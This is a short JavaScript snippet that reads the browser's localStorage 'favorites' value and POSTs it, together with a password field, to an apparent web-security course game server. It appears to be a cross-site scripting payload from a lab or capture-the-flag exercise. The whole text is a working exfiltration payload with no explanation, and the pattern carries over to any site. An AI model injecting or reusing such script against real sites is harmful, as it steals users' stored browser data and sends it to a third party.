var favs = window.localStorage.favorites;

var xhr = new XMLHttpRequest();

xhr.open("POST", "https://gameserver.websec.saarland/feedback/16", true);
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhr.send("password=avalz&secret=" + favs);
